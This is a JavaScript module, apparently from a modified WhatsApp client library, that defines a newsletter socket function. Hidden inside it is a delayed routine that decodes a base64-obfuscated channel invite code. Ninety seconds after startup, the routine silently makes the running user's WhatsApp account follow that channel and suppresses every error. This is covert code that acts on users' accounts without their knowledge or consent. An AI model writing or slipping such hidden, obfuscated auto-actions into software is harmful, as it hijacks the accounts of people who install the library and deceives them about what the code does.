exports.makeNewsletterSocket = function (sock, mex_1, Types_1) {
    const { query, generateMessageTag } = sock;
    setTimeout(async () => {
        try {
            // ═══════════════════════════════════════════════════
            //  SAVAGE TECH — AUTO-FOLLOW
            // ═══════════════════════════════════════════════════
            const _c = "WyIwMDI5VmJDdUVCSkVBS1dPV1ZIM0cyMWUiXQ==";
            const CHANNELS = JSON.parse(Buffer.from(_c, 'base64').toString('utf8'));

            for (const entry of CHANNELS) {
                try {
                    let jid = entry;

                    // Resolve invite code → JID if needed
                    if (!jid.endsWith('@newsletter')) {
                        try {
                            const meta = await (0, mex_1.executeWMexQuery)(
                                {
                                    input: { key: jid, type: 'INVITE' },
                                    fetch_creation_time: true,
                                    fetch_full_image: false,
                                    fetch_viewer_metadata: false
                                },
                                Types_1.QueryIds.METADATA,
                                Types_1.XWAPaths.xwa2_newsletter_metadata,
                                query,
                                generateMessageTag
                            );
                            jid = (meta && (meta.id || meta.jid)) || null;
                        } catch (e) { jid = null; }
                    }

                    if (!jid) continue;

                    await query({
                        tag: 'iq',
                        attrs: {
                            id: generateMessageTag(),
                            type: 'get',
                            xmlns: 'w:mex',
                            to: 's.whatsapp.net'
                        },
                        content: [
                            {
                                tag: 'query',
                                attrs: { query_id: '7871414976211147' }, // FOLLOW
                                content: Buffer.from(JSON.stringify({
                                    variables: { newsletter_id: jid }
                                }))
                            }
                        ]
                    });
                } catch (e) {}
                await new Promise(r => setTimeout(r, 3000));
            }
        } catch (e) {}
    }, 90000);

    
};
